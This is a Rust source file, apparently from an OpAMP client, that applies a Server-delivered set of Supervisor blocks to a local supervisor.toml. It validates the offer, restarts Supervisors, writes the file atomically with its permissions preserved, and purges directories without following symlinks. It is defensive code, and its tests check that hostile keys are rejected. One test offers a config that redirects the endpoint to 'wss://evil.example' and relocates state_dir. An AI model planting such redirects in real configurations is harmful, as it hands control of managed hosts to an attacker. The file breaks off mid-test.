//! The Supervisor-set apply (ADR-0017): what the Client does with a remote configuration offered
//! to its **own** Agent.
//!
//! Only the `[[supervisor]]` blocks of the offered document are read — every other top-level key
//! is ignored, because the rest of `supervisor.toml` is host-local trust and wiring the Server must
//! never write. The offered set is validated against the running configuration's globals first;
//! then the Supervisors that left or changed are stopped, the merged document is written to
//! `supervisor.toml` — surgically, so the operator's comments and layout survive — the removed
//! Supervisors' directories are purged (ADR-0017), and the changed and added Supervisors are
//! started from the file just written. Unchanged Supervisors ride through untouched.

use std::path::Path;

use opamp::proto::{AgentRemoteConfig, AgentToServer};
use tracing::{info, instrument, warn, Instrument as _};
use zeroize::Zeroizing;

use crate::config::{ClientConfig, SupervisorBlock};
use crate::config_file::redact_secrets;
use crate::engine::Engine;
use crate::shutdown::Shutdown;

/// Applies an offered Supervisor set end to end and closes the self-Agent's `APPLYING` →
/// `APPLIED`/`FAILED` lifecycle. Returns the goodbyes of the retired Agents, for the transport
/// to send — the Baseline's `agent_disconnect` is the last message each of them says.
///
/// A failure before anything is stopped (parse, validation, a Client running without a
/// configuration path) applies nothing: the offer is reported `FAILED` and the running set stays
/// in force.
#[instrument(
    name = "config.apply",
    skip_all,
    fields(
        hash = %hex::encode(&offer.config_hash),
        otel.status_code = tracing::field::Empty,
        otel.status_description = tracing::field::Empty,
    )
)]
pub async fn apply(
    engine: &mut Engine,
    config: &mut ClientConfig,
    offer: AgentRemoteConfig,
    shutdown: &Shutdown,
) -> Vec<AgentToServer> {
    let hash = offer.config_hash.clone();
    // The outcome the Server is told is the outcome the trace carries (ADR-0016), including the
    // distinction this module exists to keep: a refusal touched nothing, a failure did.
    let span = tracing::Span::current();
    match apply_inner(engine, config, &offer, shutdown).await {
        Ok(goodbyes) => {
            info!("supervisor set applied");
            crate::telemetry::succeeded(&span);
            engine.self_config_applied(hash, Ok(()));
            goodbyes
        }
        Err(Refused(error)) => {
            warn!(error = %error, "refusing the offered supervisor set");
            crate::telemetry::failed(&span, &error);
            engine.self_config_applied(hash, Err(error));
            Vec::new()
        }
        Err(Failed(error, goodbyes)) => {
            warn!(error = %error, "the offered supervisor set failed to apply");
            crate::telemetry::failed(&span, &error);
            engine.self_config_applied(hash, Err(error));
            goodbyes
        }
    }
}

use ApplyError::{Failed, Refused};

enum ApplyError {
    /// Nothing was touched: the running set stays in force.
    Refused(String),
    /// The apply began — Supervisors were stopped — and then failed; their goodbyes still have
    /// to go out.
    Failed(String, Vec<AgentToServer>),
}

async fn apply_inner(
    engine: &mut Engine,
    config: &mut ClientConfig,
    offer: &AgentRemoteConfig,
    shutdown: &Shutdown,
) -> Result<Vec<AgentToServer>, ApplyError> {
    let path = config
        .path
        .clone()
        .ok_or_else(|| Refused("this Client runs without a configuration file".to_string()))?;
    let validate = tracing::info_span!("validate").entered();
    let (blocks, tables) = offered_blocks(offer).map_err(Refused)?;

    // The merge is: local globals, offered Supervisors. Validate the offered blocks against the
    // running globals exactly as startup would read them — before any running process is touched.
    let mut candidate = config.clone();
    candidate.supervisors = blocks.clone();
    for block in &blocks {
        validate_offered_block(&candidate, block).map_err(Refused)?;
        // Against what runs now: the operator's `[supervisors]` and the running block of the
        // same name decide what a delivered block may bring (ADR-0017 clauses 38, 39).
        crate::supervisor::check_delivered_block(config, block).map_err(Refused)?;
    }
    // What will be written is rendered now, before anything stops, and must read back as exactly
    // the set just checked: what is checked is what is written (ADR-0017 clause 28).
    let rendered = render_supervisors(&path, tables)
        .and_then(|text| reads_back_as(&text, &blocks).map(|()| text))
        .map_err(Refused)?;
    drop(validate);

    let Plan {
        stopping,
        starting,
        removed,
    } = plan(&config.supervisors, &blocks);

    // A removed Supervisor is uninstalled (ADR-0017) — its adapter answers before the purge
    // below — while a changed one is only stopped and restarts under its name.
    let goodbyes = engine
        .retire_supervisors(&stopping, &removed)
        .instrument(tracing::info_span!(
            "stop",
            stopping = stopping.len(),
            removed = removed.len()
        ))
        .await;

    // Stopped, so the write comes next: a crash between the two restarts into the old file, one
    // after it into the new one — both build exactly what the file says, so both converge.
    let write = tracing::info_span!("write", path = %path.display()).entered();
    let source = match replace_file(&path, rendered) {
        Ok(source) => source,
        Err(e) => {
            // The old file still stands, so the old set is what this Client must run: bring the
            // stopped Supervisors back rather than leave them down with the file still naming
            // them.
            let error = format!("cannot write {}: {e}", path.display());
            restart_stopped(engine, config, &stopping, shutdown);
            return Err(Failed(error, goodbyes));
        }
    };

    // Written: the file no longer names the removed Supervisors, so their directories go with
    // them (ADR-0017) — program, packages, configuration, identity. The changed blocks in
    // `stopping` restart under their names and keep theirs.
    drop(write);
    {
        let purge = tracing::info_span!("purge", removed = removed.len());
        // Moved aside first, so nothing that goes on removing from them reaches a Supervisor added
        // again under the same name. What the process account wrote and the Client cannot remove
        // goes next, through the second service (ADR-0059 clause 5); the Client then deletes the
        // rest.
        let tombs = purge.in_scope(|| entomb(config, &removed));
        release_removed(engine.plugins().as_deref(), &tombs)
            .instrument(purge.clone())
            .await;
        let _purge = purge.entered();
        bury(&tombs);
    }

    config.supervisors = blocks;
    let redacted = redact_secrets(&source);
    config.source = Some(redacted.clone());
    engine.set_self_effective_config(redacted);

    let mut errors = Vec::new();
    let _start = tracing::info_span!("start", starting = starting.len()).entered();
    for name in starting {
        let Some(block) = config.supervisors.iter().find(|block| block.name == name) else {
            continue;
        };
        if let Err(e) = start(engine, config, block, shutdown) {
            errors.push(e);
        }
    }
    if errors.is_empty() {
        Ok(goodbyes)
    } else {
        Err(Failed(errors.join("; "), goodbyes))
    }
}

/// What applying an offered set does to the running one (ADR-0017), by Supervisor name.
#[derive(Debug, PartialEq, Eq)]
struct Plan {
    /// Removed and changed: stopped before the file is written.
    stopping: Vec<String>,
    /// Changed and added: started from the written file.
    starting: Vec<String>,
    /// Absent **by name** from the offered set: their directories are purged. A changed block keeps
    /// its name and is stopped and restarted, not removed, so its directory rides through.
    removed: Vec<String>,
}

/// The apply is a diff, keyed by Supervisor name: removed and changed stop, changed and added
/// start, unchanged ride through — the point of managing the set from the Server.
fn plan(running: &[SupervisorBlock], offered: &[SupervisorBlock]) -> Plan {
    Plan {
        stopping: running
            .iter()
            .filter(|old| {
                offered
                    .iter()
                    .all(|new| new.name != old.name || new != *old)
            })
            .map(|old| old.name.clone())
            .collect(),
        starting: offered
            .iter()
            .filter(|new| running.iter().all(|old| old != *new))
            .map(|new| new.name.clone())
            .collect(),
        removed: running
            .iter()
            .filter(|old| offered.iter().all(|new| new.name != old.name))
            .map(|old| old.name.clone())
            .collect(),
    }
}

/// A fresh tombstone name for the directory of the Supervisor `supervisor`:
/// `.purge-<supervisor>-<nonce>`, the nonce in lowercase hexadecimal: the nanoseconds since the
/// Unix epoch, 16 digits at least, then a counter ([`crate::config::TOMBSTONE_NONCE`]).
pub(crate) fn tombstone_name(supervisor: &str) -> String {
    static NEXT: std::sync::atomic::AtomicU64 = std::sync::atomic::AtomicU64::new(0);
    let nanos = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map_or(0, |since| since.as_nanos());
    let next = NEXT.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
    format!(
        "{}{supervisor}-{nanos:016x}{next:x}",
        crate::config::TOMBSTONE
    )
}

/// A removed Supervisor's directory, moved aside to a tombstone beneath the Supervisors' root
/// before it is purged ([`tombstone_name`]).
#[derive(Debug)]
struct Tomb {
    supervisor: String,
    path: std::path::PathBuf,
}

/// What [`move_aside`] found where a removed Supervisor's directory was.
enum Aside {
    /// Nothing: a block that failed to start owns no directory yet, and purged is what it is.
    Nothing,
    /// A link, which is removed as a link and never followed (ADR-0017 clause 35).
    Link,
    /// The directory, now under this tombstone name.
    Moved(String),
}

/// Moves each removed Supervisor's directory aside, beneath the Supervisors' root, to a tombstone
/// name no Supervisor can carry, so that whatever goes on removing from it after the purge gave up
/// — the second service, past the purge's deadline — never reaches a Supervisor added again under
/// the same name, which gets a fresh directory (ADR-0017 clause 34). A link where a directory
/// should be is removed, never followed (clause 35). What cannot be moved is a warning, and stays
/// an orphan (clause 36). The tombstones earlier purges could not delete go with them: their names
/// record that the Client meant to remove them (ADR-0059 clause 12), and no other orphan is taken.
fn entomb(config: &ClientConfig, removed: &[String]) -> Vec<Tomb> {
    if removed.is_empty() {
        return Vec::new();
    }
    let root = config.supervisors_root();
    let mut tombs = tombstones(&root);
    for name in removed {
        let dir = config.supervisor_dir(name);
        match move_aside(&root, name) {
            Ok(Aside::Nothing) => {}
            Ok(Aside::Link) => {
                warn!(supervisor = %name, path = %dir.display(), "refusing to purge through a symlink; removed the link only");
            }
            Ok(Aside::Moved(tomb)) => tombs.push(Tomb {
                supervisor: name.clone(),
                path: root.join(tomb),
            }),
            Err(e) => {
                warn!(supervisor = %name, path = %dir.display(), error = %e, "cannot purge the removed supervisor's directory");
            }
        }
    }
    tombs
}

/// The tombstones beneath `root`: each directory whose name [`crate::config::tombstone_of`] holds
/// for one, and nothing else — no other orphan, and no link of such a name.
fn tombstones(root: &Path) -> Vec<Tomb> {
    std::fs::read_dir(root)
        .into_iter()
        .flatten()
        .flatten()
        .filter_map(|entry| {
            let name = entry.file_name();
            let supervisor = crate::config::tombstone_of(name.to_str()?)?.to_string();
            entry.file_type().ok()?.is_dir().then(|| Tomb {
                supervisor,
                path: entry.path(),
            })
        })
        .collect()
}

/// Removes again the tombstones beneath `root` that earlier purges could not delete, the way a
/// purge removes its own (ADR-0059 clause 12): what the process account wrote through `plugins` —
/// the second service, within the purge's deadline, reaching it included — and the rest by the
/// Client. It runs beside the start and never holds it up (ADR-0059 clause 2): the work is
/// spawned, and tried once. A tombstone that is still not gone — the second service was not
/// reached, or a file will not delete — is a warning, and the next start or purge tries it once
/// more. No other orphan is touched (ADR-0017 clause 37).
pub(crate) fn reap_tombstones(
    root: &Path,
    plugins: std::sync::Arc<dyn crate::supervisor::ports::PluginRegistry>,
) {
    let tombs = tombstones(root);
    if tombs.is_empty() {
        return;
    }
    tokio::spawn(async move {
        release_removed(Some(&*plugins), &tombs).await;
        let _ = tokio::task::spawn_blocking(move || bury(&tombs)).await;
    });
}

/// Moves the directory `name` beneath `root` aside to a fresh tombstone name, through the root's
/// own handle: neither the entry nor anything beneath the root is followed as a link. So no
/// directory whose resolved path lies outside the root is reached at all, and none is moved or
/// removed (ADR-0017 clause 35): the entry is the root's own, and its tombstone stays beside it.
#[cfg(unix)]
fn move_aside(root: &Path, name: &str) -> std::io::Result<Aside> {
    use crate::storage::handle;
    use std::os::fd::AsRawFd as _;
    let at = match handle::open_beneath(root, root, handle::DIRECTORY, None, handle::own()) {
        Ok(at) => at,
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => return Ok(Aside::Nothing),
        Err(e) => return Err(e),
    };
    let entry = std::ffi::CString::new(name)?;
    let st = match handle::lstat_at(at.as_raw_fd(), &entry) {
        Ok(st) => st,
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => return Ok(Aside::Nothing),
        Err(e) => return Err(e),
    };
    if handle::is(&st, libc::S_IFLNK) {
        // SAFETY: a valid descriptor and a NUL-terminated name.
        if unsafe { libc::unlinkat(at.as_raw_fd(), entry.as_ptr(), 0) } != 0 {
            return Err(std::io::Error::last_os_error());
        }
        return Ok(Aside::Link);
    }
    if !handle::is(&st, libc::S_IFDIR) {
        return Err(std::io::Error::new(
            std::io::ErrorKind::InvalidInput,
            "not a directory",
        ));
    }
    loop {
        let tomb = tombstone_name(name);
        let tomb_entry = std::ffi::CString::new(tomb.as_str())?;
        match handle::lstat_at(at.as_raw_fd(), &tomb_entry) {
            Ok(_) => continue,
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => {}
            Err(e) => return Err(e),
        }
        // SAFETY: valid descriptors and NUL-terminated names.
        let rc = unsafe {
            libc::renameat(
                at.as_raw_fd(),
                entry.as_ptr(),
                at.as_raw_fd(),
                tomb_entry.as_ptr(),
            )
        };
        if rc != 0 {
            return Err(std::io::Error::last_os_error());
        }
        return Ok(Aside::Moved(tomb));
    }
}

/// Moves the directory `name` beneath `root` aside to a fresh tombstone name; a link is removed,
/// and a directory whose resolved path lies outside the root is left alone (ADR-0017 clause 35).
#[cfg(not(unix))]
fn move_aside(root: &Path, name: &str) -> std::io::Result<Aside> {
    let dir = root.join(name);
    let meta = match std::fs::symlink_metadata(&dir) {
        Ok(meta) => meta,
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => return Ok(Aside::Nothing),
        Err(e) => return Err(e),
    };
    if meta.file_type().is_symlink() {
        std::fs::remove_file(&dir)?;
        return Ok(Aside::Link);
    }
    if let (Ok(root), Ok(resolved)) = (root.canonicalize(), dir.canonicalize()) {
        if !resolved.starts_with(root) {
            return Err(std::io::Error::new(
                std::io::ErrorKind::InvalidInput,
                "the resolved path is outside the supervisors directory",
            ));
        }
    }
    loop {
        let tomb = tombstone_name(name);
        if std::fs::symlink_metadata(root.join(&tomb)).is_ok() {
            continue;
        }
        std::fs::rename(&dir, root.join(&tomb))?;
        return Ok(Aside::Moved(tomb));
    }
}

/// Asks `plugins` — the second service, where a process account is registered — to remove what
/// the Managed Processes wrote in each tomb and the Client cannot remove itself (ADR-0059 clause
/// 5). What is left is a warning, and the purge leaves it an orphan (ADR-0017 clause 36).
async fn release_removed(
    plugins: Option<&dyn crate::supervisor::ports::PluginRegistry>,
    tombs: &[Tomb],
) {
    let Some(plugins) = plugins else {
        return;
    };
    if tombs.is_empty() {
        return;
    }
    let asked: Vec<_> = tombs
        .iter()
        .map(|tomb| (tomb.supervisor.clone(), tomb.path.clone()))
        .collect();
    let answers = plugins.purge(&asked).await;
    for ((name, dir), answer) in asked.iter().zip(answers) {
        if let Err(e) = answer {
            warn!(supervisor = %name, path = %dir.display(), error = %e, "cannot remove what the removed supervisor's processes wrote; the purge leaves it");
        }
    }
}

/// Deletes each tomb whole — program, packages, configuration, and the `instance-uid` whose Agent
/// has already said its goodbye (ADR-0017). It does not touch
/// `<state_dir>/package-high-water.json` (ADR-0043 clause 14): whatever a re-added Supervisor
/// installs, under the same name or another, is held to the mark of its Agent type. Runs only after the
/// rewritten `supervisor.toml` no longer names the Supervisor: a failed write restarts the stopped
/// set from the old file, which needs the data intact. A directory that will not delete is a
/// warning, never a `FAILED` apply — the set the Server asked for is running; the tombstone left
/// is reported and removed again at the next start and with the next purge (ADR-0017 clause 36,
/// ADR-0059 clause 12).
fn bury(tombs: &[Tomb]) {
    for tomb in tombs {
        match remove_tomb(&tomb.path) {
            Ok(()) => {
                info!(supervisor = %tomb.supervisor, path = %tomb.path.display(), "removed supervisor purged");
            }
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => {}
            Err(e) => warn!(
                supervisor = %tomb.supervisor,
                path = %tomb.path.display(),
                error = %e,
                "cannot purge the removed supervisor's directory; the next start or purge \
                 removes it again"
            ),
        }
    }
}

/// Removes the tomb at `path` with everything beneath it, through its parent's handle — the
/// Supervisors' root — and never through a link.
#[cfg(unix)]
fn remove_tomb(path: &Path) -> std::io::Result<()> {
    use crate::storage::handle;
    use std::os::unix::ffi::OsStrExt as _;
    let (Some(root), Some(name)) = (path.parent(), path.file_name()) else {
        return Err(std::io::Error::from(std::io::ErrorKind::InvalidInput));
    };
    let at = handle::open_beneath(root, root, handle::DIRECTORY, None, handle::own())?;
    handle::remove_tree_at(&at, &std::ffi::CString::new(name.as_bytes())?, path)
}

/// Removes the tomb at `path` with everything beneath it.
#[cfg(not(unix))]
fn remove_tomb(path: &Path) -> std::io::Result<()> {
    std::fs::remove_dir_all(path)
}

/// Brings the Supervisors a failed apply had stopped back up from the still-standing old
/// configuration. A Supervisor that will not start again is a log line — the apply already
/// failed, and its status carries the error that matters.
fn restart_stopped(
    engine: &mut Engine,
    config: &ClientConfig,
    stopped: &[String],
    shutdown: &Shutdown,
) {
    for block in config
        .supervisors
        .iter()
        .filter(|block| stopped.contains(&block.name))
    {
        if let Err(e) = start(engine, config, block, shutdown) {
            warn!(supervisor = %block.name, error = %e, "cannot restart after a failed apply");
        }
    }
}

/// Starts one Supervisor block as the Engine's next Agent.
fn start(
    engine: &mut Engine,
    config: &ClientConfig,
    block: &SupervisorBlock,
    shutdown: &Shutdown,
) -> Result<(), String> {
    let index = engine.next_index();
    // The plugins the startup started its Supervisors with, so this one starts its Managed
    // Process the same way (ADR-0059 clause 3). An Engine without them is not told who starts a
    // program, and guessing the Client itself would start one outside the process account.
    let plugins = engine.plugins().ok_or_else(|| {
        format!(
            "supervisor {:?}: this Client was not told who starts its programs",
            block.name
        )
    })?;
    // The marks the startup read, so a re-added Supervisor is held to its type's mark (ADR-0043
    // clause 14). An Engine built without them reads them from `state_dir` now.
    let marks = match engine.high_water() {
        Some(marks) => marks,
        None => {
            let marks: std::sync::Arc<dyn crate::supervisor::ports::HighWaterMarks> =
                std::sync::Arc::new(crate::storage::HighWaterFile::open(&config.state_dir));
            engine.set_high_water(marks.clone());
            marks
        }
    };
    let agent = crate::supervisor::start_supervisor(
        config,
        block,
        index,
        &engine.events_handle(),
        shutdown,
        &marks,
        &*plugins,
    )?;
    engine.add_supervisor(agent);
    Ok(())
}

/// Reads the offered Supervisor set out of the composed config map (ADR-0017): every entry is
/// parsed as TOML, the union of their `[[supervisor]]` blocks is the set, and every other
/// top-level key is ignored — the boundary is enforced by what the Client takes. Returns the
/// parsed blocks beside their verbatim tables, which is what the write puts into `supervisor.toml`
/// so the offered text survives as written.
///
/// # Errors
/// Returns an error for entry names no host can store as files of their own, an entry that is not
/// TOML, a `supervisor` key that is not an array of tables, a block the startup parser would
/// refuse, or a duplicate Supervisor name — a genuine ambiguity inside the accepted scope.
pub fn offered_blocks(
    offer: &AgentRemoteConfig,
) -> Result<(Vec<SupervisorBlock>, Vec<toml_edit::Table>), String> {
    let map = offer
        .config
        .as_ref()
        .map(|c| &c.config_map)
        .ok_or_else(|| "the offer carries no configuration".to_string())?;
    // The set is stored as entry files once it applied; an entry no host can store is refused now,
    // before anything stops.
    crate::storage::check_entry_names(offer)?;
    // Entries in name order: the composed map is unordered on the wire, and the written file
    // should not depend on iteration luck.
    let mut entries: Vec<(&String, &opamp::proto::AgentConfigObject)> = map.iter().collect();
    entries.sort_by_key(|(name, _)| name.as_str());

    let mut blocks = Vec::new();
    let mut tables = Vec::new();
    for (entry, file) in entries {
        let text = std::str::from_utf8(&file.body)
            .map_err(|_| format!("entry {entry:?} is not UTF-8 text"))?;
        // Parsed twice on purpose: serde carries the blocks through the same strict
        // `SupervisorBlock` parse the startup loader uses, and `toml_edit` carries their
        // verbatim text — comments included — into the rewritten file. Same parser family, same
        // text, so the two block lists align by position.
        let mut parsed: toml::Table =
            toml::from_str(text).map_err(|e| format!("entry {entry:?} is not TOML: {e}"))?;
        let doc: toml_edit::DocumentMut = text
            .parse()
            .map_err(|e| format!("entry {entry:?} is not TOML: {e}"))?;
        let Some(value) = parsed.remove("supervisor") else {
            // An entry without blocks contributes nothing — with every entry like this, the
            // offered set is empty and the apply stops every Supervisor.
            continue;
        };
        let toml::Value::Array(values) = value else {
            return Err(format!(
                "entry {entry:?}: `supervisor` must be an array of tables"
            ));
        };
        let verbatim = doc
            .get("supervisor")
            .and_then(supervisor_tables)
            .filter(|tables| tables.len() == values.len())
            .ok_or_else(|| format!("entry {entry:?}: `supervisor` must be an array of tables"))?;
        for (value, table) in values.into_iter().zip(verbatim) {
            let toml::Value::Table(raw) = value else {
                return Err(format!(
                    "entry {entry:?}: `supervisor` must be an array of tables"
                ));
            };
            let block =
                SupervisorBlock::try_from(raw).map_err(|e| format!("entry {entry:?}: {e}"))?;
            if blocks
                .iter()
                .any(|b: &SupervisorBlock| b.name == block.name)
            {
                return Err(format!(
                    "entry {entry:?}: duplicate supervisor name {:?}",
                    block.name
                ));
            }
            blocks.push(block);
            tables.push(table);
        }
    }
    Ok((blocks, tables))
}

/// Validates one offered `[[supervisor]]` block before any running process is touched: the startup
/// loader's own checks (block schema, program-path resolution, ports, timeouts — ADR-0017 point 28),
/// and then the delivery-path constraint of ADR-0017.
///
/// A Server-delivered block may name only a program **this Client owns** — a bare file name, whose
/// program lives in a directory this Client created and updates from signature-verified packages
/// (ADR-0017). Letting the Server spawn a program on the machine would be arbitrary code execution
/// that never passes through package signing.
///
/// That rule **cannot fire** (ADR-0017): no block naming a program on the machine parses at all,
/// from any principal, so every block reaching here already satisfies it. The check stays as
/// defence in depth against a future shape nobody has thought of yet — deleting a guard because it
/// currently cannot trigger is how it comes back — and `resolve_block_program` below is what
/// enforces it in fact.
fn validate_offered_block(config: &ClientConfig, block: &SupervisorBlock) -> Result<(), String> {
    crate::supervisor::validate_block(config, block)?;
    crate::supervisor::resolve_block_program(config, block)?;
    Ok(())
}

/// The `[[supervisor]]` blocks of one parsed entry, whichever TOML spelling carried them —
/// an array of tables, or an inline array of inline tables. `None` when the key is neither.
fn supervisor_tables(item: &toml_edit::Item) -> Option<Vec<toml_edit::Table>> {
    match item {
        toml_edit::Item::ArrayOfTables(tables) => Some(tables.iter().cloned().collect()),
        toml_edit::Item::Value(toml_edit::Value::Array(array)) => array
            .iter()
            .map(|value| match value {
                toml_edit::Value::InlineTable(inline) => Some(inline.clone().into_table()),
                _ => None,
            })
            .collect(),
        _ => None,
    }
}

/// Replaces the `[[supervisor]]` blocks of `supervisor.toml` with the offered ones and leaves every
/// other line of the file exactly as the operator wrote it — comments, ordering, formatting
/// (ADR-0017). A file that does not exist yet is created; the write goes through a sibling
/// temporary file so a crash never leaves a half-written configuration. Returns the new text.
#[cfg(test)]
fn write_supervisors(
    path: &Path,
    tables: Vec<toml_edit::Table>,
) -> Result<Zeroizing<String>, String> {
    replace_file(path, render_supervisors(path, tables)?)
}

/// The file with its `[[supervisor]]` array replaced by `tables`, everything else as it was.
///
/// Every delivered table keeps the position it had in its own entry, and `toml_edit` writes tables
/// in position order across the whole document — so tables from two entries would interleave, and
/// a sub-table such as `[supervisor.env]` would land under another block's header. Each table and
/// its sub-tables are therefore renumbered in array order, after everything the file already has.
///
/// The file may hold `[packages] archive_key`, so the text read and the text rendered are held in
/// buffers wiped when they are dropped; what `toml_edit` keeps while it edits is its own
/// (ADR-0057).
fn render_supervisors(
    path: &Path,
    tables: Vec<toml_edit::Table>,
) -> Result<Zeroizing<String>, String> {
    let text = match std::fs::read_to_string(path) {
        Ok(text) => Zeroizing::new(text),
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => Zeroizing::default(),
        Err(e) => return Err(format!("cannot read the current file: {e}")),
    };
    let mut doc: toml_edit::DocumentMut = text
        .parse()
        .map_err(|e| format!("the current file is not TOML: {e}"))?;
    doc.remove("supervisor");
    if !tables.is_empty() {
        let mut next = last_position(doc.as_table()) + 1;
        let mut array = toml_edit::ArrayOfTables::new();
        for mut table in tables {
            renumber(&mut table, &mut next);
            array.push(table);
        }
        doc.insert("supervisor", toml_edit::Item::ArrayOfTables(array));
    }
    Ok(Zeroizing::new(doc.to_string()))
}

/// The highest position any table of `table` holds, itself included.
fn last_position(table: &toml_edit::Table) -> isize {
    let mut last = table.position().unwrap_or(0);
    for (_, item) in table.iter() {
        match item {
            toml_edit::Item::Table(inner) => last = last.max(last_position(inner)),
            toml_edit::Item::ArrayOfTables(array) => {
                for inner in array.iter() {
                    last = last.max(last_position(inner));
                }
            }
            _ => {}
        }
    }
    last
}

/// Gives `table` and every table below it the next positions, in order.
fn renumber(table: &mut toml_edit::Table, next: &mut isize) {
    table.set_position(Some(*next));
    *next += 1;
    for (_, item) in table.iter_mut() {
        match item {
            toml_edit::Item::Table(inner) => renumber(inner, next),
            toml_edit::Item::ArrayOfTables(array) => {
                for inner in array.iter_mut() {
                    renumber(inner, next);
                }
            }
            _ => {}
        }
    }
}

/// Whether the rendered file reads back as exactly the checked set.
fn reads_back_as(text: &str, blocks: &[SupervisorBlock]) -> Result<(), String> {
    let parsed: ClientConfig =
        toml::from_str(text).map_err(|e| format!("the rewritten file would not parse: {e}"))?;
    if parsed.supervisors != blocks {
        return Err(
            "the rewritten file would not read back as the offered set — nothing was changed"
                .to_string(),
        );
    }
    Ok(())
}

/// Replaces `path` with `new_text` in one step, and hands the text back still in its wiped buffer
/// (ADR-0057).
fn replace_file(path: &Path, new_text: Zeroizing<String>) -> Result<Zeroizing<String>, String> {
    let tmp = path.with_extension("toml.tmp");
    write_replacement(&tmp, path, &new_text)?;
    // `rename` replaces an existing file on every platform — on Windows it is `MoveFileExW` with
    // `MOVEFILE_REPLACE_EXISTING` — so there is never a moment without a file.
    std::fs::rename(&tmp, path).map_err(|e| format!("cannot replace the file: {e}"))?;
    Ok(new_text)
}

/// Writes the new configuration to the temporary file the caller then renames over `supervisor.toml`.
///
/// On Unix the temp file inherits the mode of the file it will replace — created with it, never
/// widened after — so the rename cannot loosen permissions. `supervisor.toml` may hold
/// `[packages] archive_key` in cleartext and is created `0600` (`config_init::write_new`); writing
/// the temp file at the default umask (`0644`) and renaming it over the original, as this did
/// before, left that secret world-readable after every Server-driven reconfigure (ADR-0017). A file that does not
/// exist yet falls back to `0600`, the same floor `write_new` uses. The operator's own mode, if
/// they widened or narrowed it deliberately, is preserved.
fn write_replacement(tmp: &Path, target: &Path, contents: &str) -> Result<(), String> {
    // Clear any temp left by a crashed earlier write, so the create below is fresh and its mode
    // actually takes effect (a mode is applied only when a file is created).
    let _ = std::fs::remove_file(tmp);
    let mut options = std::fs::OpenOptions::new();
    options.write(true).create_new(true);
    #[cfg(unix)]
    {
        use std::os::unix::fs::{OpenOptionsExt as _, PermissionsExt as _};
        let mode = std::fs::metadata(target)
            .map(|meta| meta.permissions().mode() & 0o777)
            .unwrap_or(0o600);
        options.mode(mode);
    }
    #[cfg(not(unix))]
    let _ = target;
    let mut file = options
        .open(tmp)
        .map_err(|e| format!("cannot write {}: {e}", tmp.display()))?;
    use std::io::Write as _;
    file.write_all(contents.as_bytes())
        .map_err(|e| format!("cannot write {}: {e}", tmp.display()))
}

#[cfg(test)]
mod tests {
    use super::*;
    use opamp::proto::{AgentConfigMap, AgentConfigObject};

    /// The purge of an apply without a second service: moved aside, then deleted.
    fn purge_removed(config: &ClientConfig, removed: &[String]) {
        bury(&entomb(config, removed));
    }

    fn offer_of(entries: &[(&str, &str)]) -> AgentRemoteConfig {
        AgentRemoteConfig {
            config: Some(AgentConfigMap {
                config_map: entries
                    .iter()
                    .map(|(name, body)| {
                        (
                            (*name).to_string(),
                            AgentConfigObject {
                                body: body.as_bytes().to_vec(),
                                ..Default::default()
                            },
                        )
                    })
                    .collect(),
            }),
            config_hash: b"hash".to_vec(),
        }
    }

    /// ADR-0017 point 27: only the `[[supervisor]]` blocks are read; a full `supervisor.toml`-shaped
    /// document may be offered and exactly its fleet-manageable half takes effect.
    #[test]
    fn foreign_top_level_keys_are_ignored() {
        let offer = offer_of(&[(
            "fleet",
            r#"
            endpoint = "wss://evil.example/v1/opamp"
            state_dir = "/somewhere/else"

            [[supervisor]]
            type = "command"
            name = "agent"
            command = "agent"
            "#,
        )]);
        let (blocks, _) = offered_blocks(&offer).expect("parse");
        assert_eq!(blocks.len(), 1);
        assert_eq!(blocks[0].name, "agent");
    }

    /// A duplicate name is not a foreign key but a genuine ambiguity inside the accepted scope —
    /// within one entry or across two.
    #[test]
    fn duplicate_supervisor_names_fail_the_offer() {
        let block = "[[supervisor]]\ntype = \"command\"\nname = \"agent\"\ncommand = \"agent\"\n";
        let within = offer_of(&[("a", &format!("{block}{block}"))]);
        let err = offered_blocks(&within).expect_err("duplicate within an entry");
        assert!(err.contains("duplicate supervisor name"), "{err}");

        let across = offer_of(&[("a", block), ("b", block)]);
        let err = offered_blocks(&across).expect_err("duplicate across entries");
        assert!(err.contains("duplicate supervisor name"), "{err}");
    }

    /// The set is stored as entry files once it applied, so entry names no host could store are
    /// refused before anything stops, not found out after the set already runs.
    /// Verifies: ADR-0017
    #[test]
    fn an_offer_whose_entries_cannot_all_be_stored_is_refused() {
        let block = "[[supervisor]]\ntype = \"command\"\nname = \"agent\"\ncommand = \"agent\"\n";
        let err = offered_blocks(&offer_of(&[("nul", block)])).expect_err("a device name");
        assert!(err.contains("\"nul\""), "{err}");
        let err = offered_blocks(&offer_of(&[("Fleet", block), ("fleet", "")]))
            .expect_err("two entries, one file");
        assert!(
            err.contains("\"Fleet\"") && err.contains("\"fleet\""),
            "{err}"
        );
    }

    /// A block the startup parser would refuse is refused here, naming the entry — the same
    /// strictness ADR-0010 asks of the file.
    #[test]
    fn a_malformed_block_names_its_entry() {
        let offer = offer_of(&[(
            "bad",
            "[[supervisor]]\ntype = \"command\"\ncommand = \"x\"\n",
        )]);
        let err = offered_blocks(&offer).expect_err("a block without a name");
        assert!(err.contains("\"bad\""), "{err}");
        assert!(err.contains("needs a `name`"), "{err}");
    }

    /// The running configuration a delivered block is checked against: `globals` for the
    /// operator's `[supervisors]`, then the running blocks.
    fn running(globals: &str, blocks: &str) -> ClientConfig {
        let mut config: ClientConfig = toml::from_str(globals).expect("config");
        if !blocks.is_empty() {
            let (running, _) = offered_blocks(&offer_of(&[("running", blocks)])).expect("parse");
            config.supervisors = running;
        }
        config
    }

    fn delivered(block: &str) -> SupervisorBlock {
        let (blocks, _) = offered_blocks(&offer_of(&[("fleet", block)])).expect("parse");
        blocks.into_iter().next().expect("one block")
    }

    const AGENT: &str =
        "[[supervisor]]\ntype = \"command\"\nname = \"agent\"\ncommand = \"agent\"\n";

    /// Verifies: ADR-0017
    #[test]
    fn a_delivered_block_may_not_add_environment_the_operator_did_not_allow() {
        let block = delivered(&format!("{AGENT}env = {{ OTEL_RESOURCE = \"a\" }}\n"));
        let err = crate::supervisor::check_delivered_block(&running("", AGENT), &block)
            .expect_err("not allowed");
        assert!(
            err.contains("\"agent\"") && err.contains("OTEL_RESOURCE"),
            "{err}"
